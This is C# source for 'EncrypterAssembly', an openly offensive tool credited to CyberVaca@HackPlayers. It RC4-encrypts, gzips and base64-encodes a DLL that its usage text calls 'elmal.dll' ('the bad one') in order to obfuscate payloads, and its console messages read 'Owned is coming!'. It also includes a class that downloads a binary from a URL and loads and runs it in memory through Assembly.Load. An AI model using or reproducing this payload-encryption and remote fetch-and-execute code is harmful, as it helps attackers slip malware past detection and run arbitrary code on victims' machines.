/*
 * Creado por SharpDevelop.
 * User: CyberVaca 
 * Twitter: https://twitter.com/CyberVaca_
 * Date: 10/11/2018
 * Para cambiar esta plantilla use Herramientas | Opciones | Codificación | Editar Encabezados Estándar
 */
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Reflection;
namespace EncryterAssembly
{
class Program
{

static void Main(string[] args)
{

string banner = @"
 _____                            _            
|  ___|                          | |           
| |__ _ __   ___ _ __ _   _ _ __ | |_ ___ _ __ 
|  __| '_ \ / __| '__| | | | '_ \| __/ _ \ '__|
| |__| | | | (__| |  | |_| | |_) | ||  __/ |   
\____/_| |_|\___|_|   \__, | .__/ \__\___|_|   
                       __/ | |                 
                      |___/|_|                 
  ___                         _     _          
 / _ \                       | |   | |         
/ /_\ \___ ___  ___ _ __ ___ | |__ | |_   _    
|  _  / __/ __|/ _ \ '_ ` _ \| '_ \| | | | |   
| | | \__ \__ \  __/ | | | | | |_) | | |_| |   
\_| |_/___/___/\___|_| |_| |_|_.__/|_|\__, |   
                                       __/ |   
                                      |___/    
  
				By: CyberVaca@HackPlayers
                                                                     

";

  if (args.Length <= 2)
            {
  				Console.ForegroundColor = ConsoleColor.Green;
  				Console.WriteLine(banner);
  				Console.ForegroundColor = ConsoleColor.White;
  				Console.WriteLine(@"[-] Insuficientes parametros :("); Console.WriteLine();
  	            Console.WriteLine("[+] Ejemplo:");
  	            Console.WriteLine("[+] EncrypterAssembly.exe elmal.dll passwordsecretisitma output.txt");
                System.Environment.Exit(1);
            }
  


  
  
string target_dll = args[0].ToString();
if (System.IO.File.Exists(target_dll) == true) { } else { Console.WriteLine("\n[+] Error, no existe la dll :("); System.Environment.Exit(1); }
string clave = args[1].ToString();
string path = args[2].ToString();
string claves = "";
foreach (byte item in clave)
{
claves += " " + item.ToString();
}
byte[] futurakey = Encoding.ASCII.GetBytes(clave);

Console.ForegroundColor = ConsoleColor.Green;
Console.Write(banner);
Console.WriteLine();
Console.ForegroundColor = ConsoleColor.Green;
Console.WriteLine("Cifrando payloads cabesha! ");
Console.ForegroundColor = ConsoleColor.Green;
Console.WriteLine("Owned is coming!\n");
Console.ForegroundColor = ConsoleColor.Green;
Console.WriteLine("[+] Usando encriptacion RC4");
Console.ForegroundColor = ConsoleColor.Green;
Console.WriteLine("[+] Key RC4:" + claves);
//------------------------------------------------------//
//					Leemos dll a encriptar				//
//------------------------------------------------------//
byte[] XPay = System.IO.File.ReadAllBytes(target_dll);
 //------------------------------------------------------//
//			Encriptamos dll y pasamos a hexadecimal		//
//------------------------------------------------------//
byte[] movida_encriptada = RC4.Encrypt(futurakey,XPay);
string hexadecimal = BiteArrayToHex.Convierte(movida_encriptada);
string cabeshahex = BiteArrayToHex.Convierte(futurakey);
Console.WriteLine("cabesha en HEX");
Console.WriteLine(cabeshahex);
string base64 = Zipea.Comprime(hexadecimal);
System.IO.File.WriteAllText(path,base64);
Console.WriteLine("archivo encriptado ");
Console.WriteLine(hexadecimal);
Console.WriteLine(base64);
Console.WriteLine("movida encriptada");
Console.WriteLine();
Console.WriteLine("[+] Archivo guardado en: " + path);
Console.ForegroundColor = ConsoleColor.White;
        }
}
    public class BiteArrayToHex
    {
        public static string Convierte(byte[] bytearray_a_convertir)
        {
            return (BitConverter.ToString(bytearray_a_convertir)).Replace("-", "").ToLower();
        }

    }

    public class BiteArrayFromArchivo
    {

        public static byte[] ExtraeBites(string Archivo_a_leer)
        {
            byte[] Bites_extraidos = System.IO.File.ReadAllBytes(Archivo_a_leer);
            return Bites_extraidos;
        }


    }

    public class StringHEXToByteArray
    {
        public static byte[] Convierte(String hex)
        {
            int NumberChars = hex.Length;
            byte[] bytes = new byte[NumberChars / 2];

            for (int i = 0; i < NumberChars; i += 2)
            {
                bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
            }

            return bytes;
        }
    }

    public class BitArrayToString
    {

        public static string Convierte(byte[] movidaaconvertir)
        {
            string a = "";
            foreach (Byte b in movidaaconvertir)
            {
                a += (b + " ");
            }
            return a;
        }

    }

    public class RC4
    {

        public static byte[] Encrypt(byte[] pwd, byte[] data)
        {
            int a, i, j, k, tmp;
            int[] key, box;
            byte[] cipher;

            key = new int[256];
            box = new int[256];
            cipher = new byte[data.Length];

            for (i = 0; i < 256; i++)
            {
                key[i] = pwd[i % pwd.Length];
                box[i] = i;
            }
            for (j = i = 0; i < 256; i++)
            {
                j = (j + box[i] + key[i]) % 256;
                tmp = box[i];
                box[i] = box[j];
                box[j] = tmp;
            }
            for (a = j = i = 0; i < data.Length; i++)
            {
                a++;
                a %= 256;
                j += box[a];
                j %= 256;
                tmp = box[a];
                box[a] = box[j];
                box[j] = tmp;
                k = box[((box[a] + box[j]) % 256)];
                cipher[i] = (byte)(data[i] ^ k);
            }
            return cipher;
        }

        public static byte[] Decrypt(byte[] pwd, byte[] data)
        {
            return Encrypt(pwd, data);
        }

        public static byte[] StringToByteArray(String hex)
        {
            int NumberChars = hex.Length;
            byte[] bytes = new byte[NumberChars / 2];
            for (int i = 0; i < NumberChars; i += 2)
                bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
            return bytes;
        }

    }

    public class Zipea
    {
        private static void CopyTo(Stream src, Stream dest)
        {
            byte[] bytes = new byte[4096];

            int cnt;

            while ((cnt = src.Read(bytes, 0, bytes.Length)) != 0)
            {
                dest.Write(bytes, 0, cnt);
            }
        }

        public static string Comprime(string movidaacomprimir)
        {

            byte[] inputBytes = Encoding.UTF8.GetBytes(movidaacomprimir);

            using (var outputStream = new MemoryStream())
            {
                using (var gZipStream = new GZipStream(outputStream, CompressionMode.Compress))
                    gZipStream.Write(inputBytes, 0, inputBytes.Length);
                var outputBytes = outputStream.ToArray();
                var outputbase64 = Convert.ToBase64String(outputBytes);
                return outputbase64;

            }
        }
        public static string Descomprime(string movidaadescomprimir)
        {
            byte[] gZipBuffer = Convert.FromBase64String(movidaadescomprimir);
            using (var msi = new MemoryStream(gZipBuffer))
            using (var mso = new MemoryStream())
            {
                using (var gs = new GZipStream(msi, CompressionMode.Decompress))
                {

                    CopyTo(gs, mso);
                }

                return Encoding.UTF8.GetString(mso.ToArray());
            }


        }
    }

    public class Carga_y_ejecuta_Pe
    {


        public static void loadAssembly(byte[] bin, object[] commands)
        {
            Assembly a = Assembly.Load(bin);
            try
            {
                a.EntryPoint.Invoke(null, new object[] { commands });
            }
            catch
            {
                MethodInfo method = a.EntryPoint;
                if (method != null)
                {
                    object o = a.CreateInstance(method.Name);
                    method.Invoke(o, null);
                }
            }
        }


    }

    public class Descarga_bytes_por_http
    {

        public static void Ejecuta(string http, object[] cmd)
        {
            MemoryStream ms = new MemoryStream();
            using (WebClient client = new WebClient())
            {
                //Access web and read the bytes from the binary file
                System.Net.ServicePointManager.SecurityProtocol = System.Net.SecurityProtocolType.Tls; 
                ms = new MemoryStream(client.DownloadData(http));
                BinaryReader br = new BinaryReader(ms);
                byte[] bin = br.ReadBytes(Convert.ToInt32(ms.Length));
                ms.Close();
                br.Close();
                Carga_y_ejecuta_Pe.loadAssembly(bin, cmd);
            }

        }
    }


}
